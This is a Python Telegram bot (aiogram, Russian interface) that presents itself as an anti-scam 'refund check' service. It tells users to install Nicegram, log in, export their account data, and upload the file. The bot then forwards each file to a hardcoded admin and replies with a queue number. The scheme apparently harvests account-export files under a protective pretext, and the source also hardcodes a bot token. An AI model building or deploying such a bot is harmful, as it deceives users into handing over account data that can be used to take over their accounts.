import asyncio
import logging
import sqlite3
from pathlib import Path
from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InputFile, 
    FSInputFile, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    ReplyKeyboardMarkup,   # Добавлено для работы WebApp sendData
    KeyboardButton,        # Добавлено
    WebAppInfo            # Добавлено
)
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
import sys
import datetime
import aiohttp
import json

# Конфигурация
TOKEN = "8386031733:AAHU7CxXWA34nkPI7gH_uMlTI-iMy7BET60" 
ADMIN_ID = 7225974704 
WEBAPP_URL = "https://ng-web-liart.vercel.app" 

# Создаем роутер
router = Router()
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Состояния FSM
class AdminStates(StatesGroup):
    waiting_for_queue_number = State()

class SupportStates(StatesGroup):
    waiting_for_support_message = State()

# Хранилище для message_id сообщений поддержки
support_messages = {}

# Инициализация базы данных
def init_database():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        first_seen DATETIME,
        last_seen DATETIME
    )
    ''')
    conn.commit()
    conn.close()

def check_first_time_user(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    return user is None

def add_new_user(user_id, username, first_name):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('''
    INSERT INTO users (user_id, username, first_name, first_seen, last_seen)
    VALUES (?, ?, ?, ?, ?)
    ''', (user_id, username, first_name, now, now))
    conn.commit()
    conn.close()

def update_last_seen(user_id):
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cursor.execute('UPDATE users SET last_seen = ? WHERE user_id = ?', (now, user_id))
    conn.commit()
    conn.close()

async def send_first_start_to_admin(user_id: int, username: str, first_name: str):
    try:
        await bot.send_message(
            ADMIN_ID,
            f"👤 <b>ПЕРВЫЙ ЗАПУСК бота</b>\n\n"
            f"🆕 Пользователь: @{username or 'нет'}\n"
            f"🆔 ID: {user_id}\n"
            f"👤 Имя: {first_name}"
        )
    except Exception as e:
        print(f"Ошибка уведомления админа: {e}")

# ОБНОВЛЕННОЕ ГЛАВНОЕ МЕНЮ (Reply Keyboard)
def get_main_menu():
    # Важно: кнопка с WebApp должна быть KeyboardButton, чтобы работал sendData()
    keyboard = [
        [KeyboardButton(text="🔍 Проверка на рефаунд", web_app=WebAppInfo(url=WEBAPP_URL))],
        [KeyboardButton(text="📖 Инструкция"), KeyboardButton(text="🆘 Поддержка")],
        [KeyboardButton(text="📲 Скачать Nicegram", web_app=WebAppInfo(url="https://nicegram.app/"))]
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

def get_back_keyboard():
    keyboard = [[InlineKeyboardButton(text="↩️ Назад", callback_data="back_to_main")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_admin_keyboard(user_id):
    keyboard = [[InlineKeyboardButton(text="📋 Поставить на очередь", callback_data=f"queue_{user_id}")]]
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# Стартовая команда
@router.message(CommandStart())
async def cmd_start(message: Message):
    user = message.from_user
    if check_first_time_user(user.id):
        await send_first_start_to_admin(user.id, user.username, user.first_name)
        add_new_user(user.id, user.username, user.first_name)
    else:
        update_last_seen(user.id)
    
    caption = "Привет! Я - Бот, который поможет тебе не попасться на мошенников. Выбери действие:"
    photo_path = Path("1.png")
    
    if photo_path.exists():
        await message.answer_photo(photo=FSInputFile(photo_path), caption=caption, reply_markup=get_main_menu())
    else:
        await message.answer(caption, reply_markup=get_main_menu())

# Обработка текстовой кнопки "📖 Инструкция"
@router.message(F.text == "📖 Инструкция")
async def instruction_text_handler(message: Message):
    instruction_text = """<b>📖 Инструкция:</b>
1. Скачайте Nicegram.
2. Войдите в аккаунт и экспортируйте данные.
3. Нажмите '🔍 Проверка на рефаунд'.
4. Загрузите файл в открывшемся окне."""
    await message.answer(instruction_text, reply_markup=get_main_menu())

# Обработка текстовой кнопки "🆘 Поддержка"
@router.message(F.text == "🆘 Поддержка")
async def support_text_handler(message: Message, state: FSMContext):
    support_msg = await message.answer(
        "🆘 <b>Обращение в поддержку</b>\n\nНапишите ваше сообщение. Мы ответим в течение 30 минут.",
        reply_markup=get_back_keyboard()
    )
    support_messages[message.from_user.id] = support_msg.message_id
    await state.set_state(SupportStates.waiting_for_support_message)

# Обработка данных из WebApp (Теперь это будет работать!)
@router.message(F.web_app_data)
async def handle_webapp_data(message: Message):
    user = message.from_user
    raw = (message.web_app_data.data or "").strip()
    
    file_url, file_name = None, None
    try:
        payload = json.loads(raw)
        if isinstance(payload, dict):
            file_url = payload.get("file_url")
            file_name = payload.get("file_name")
    except:
        if raw.startswith("http"): file_url = raw

    if not file_url:
        await message.answer("❌ Ошибка получения данных из WebApp.")
        return

    await message.answer("✅ Файл получен и отправлен администратору на проверку.")

    tmp_dir = Path("tmp_downloads")
    tmp_dir.mkdir(exist_ok=True)
    safe_name = "".join(ch for ch in (file_name or "file") if ch.isalnum() or ch in "._- ").strip()
    tmp_path = tmp_dir / safe_name

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(file_url, timeout=60) as resp:
                if resp.status == 200:
                    with tmp_path.open("wb") as f:
                        f.write(await resp.read())
                    
                    await bot.send_document(
                        ADMIN_ID,
                        document=FSInputFile(tmp_path),
                        caption=f"📥 <b>Файл из WebApp</b>\n👤 От: @{user.username} (ID: {user.id})",
                        reply_markup=get_admin_keyboard(user.id)
                    )
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ Ошибка скачивания файла: {e}")
    finally:
        if tmp_path.exists(): tmp_path.unlink()

# Обработка сообщений для поддержки
@router.message(SupportStates.waiting_for_support_message)
async def process_support_message(message: Message, state: FSMContext):
    await message.answer("✅ Сообщение получено! Ожидайте ответа.", reply_markup=get_main_menu())
    await bot.send_message(ADMIN_ID, f"🆘 <b>Новое обращение!</b>\nОт: @{message.from_user.username}\nТекст: {message.text}")
    await state.clear()

# Обработка документов
@router.message(F.document)
async def handle_document(message: Message):
    file_name = message.document.file_name or ""
    if not file_name.lower().endswith(('.txt', '.zip')):
        await message.answer("🤔 Принимаются только .txt или .zip")
        return
    
    await message.answer("✅ Файл отправлен на проверку.")
    await bot.send_document(
        ADMIN_ID,
        document=message.document.file_id,
        caption=f"📥 <b>Новый файл</b>\n👤 От: @{message.from_user.username}",
        reply_markup=get_admin_keyboard(message.from_user.id)
    )

# Очередь (админ)
@router.callback_query(F.data.startswith("queue_"))
async def queue_handler(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID: return
    user_id = int(callback.data.split("_")[1])
    await state.set_state(AdminStates.waiting_for_queue_number)
    await state.update_data(user_id=user_id)
    await callback.message.answer(f"🔢 Введите номер очереди для {user_id}:")
    await callback.answer()

@router.message(AdminStates.waiting_for_queue_number)
async def process_queue_number(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID: return
    try:
        num = int(message.text)
        data = await state.get_data()
        await bot.send_message(data['user_id'], f"✅ Вы поставлены в очередь №{num}")
        await message.answer("✅ Готово")
    except:
        await message.answer("❌ Введите число")
    await state.clear()

# Возврат
@router.callback_query(F.data == "back_to_main")
async def back_to_main_handler(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.answer("Главное меню", reply_markup=get_main_menu())
    await callback.answer()

async def main():
    init_database()
    dp.include_router(router)
    await bot.send_message(ADMIN_ID, "🤖 Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
